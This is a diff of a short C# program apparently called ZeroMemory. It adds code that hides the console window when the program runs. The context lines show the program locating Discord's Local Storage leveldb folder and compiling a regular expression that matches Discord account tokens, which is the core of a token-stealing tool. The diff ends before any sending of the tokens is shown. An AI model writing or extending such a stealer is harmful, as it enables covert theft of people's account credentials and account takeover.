@@ -12,10 +12,16 @@ github : https://github.com/ZeroM3m0ry
  */
 class ZeroMemory
 {
+    static int SW_HIDE = 0;
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
 
     public static void Main()
     {
-
+        IntPtr myWindow = GetConsoleWindow();
+        ShowWindow(myWindow, SW_HIDE);
         string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb";
         Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
 
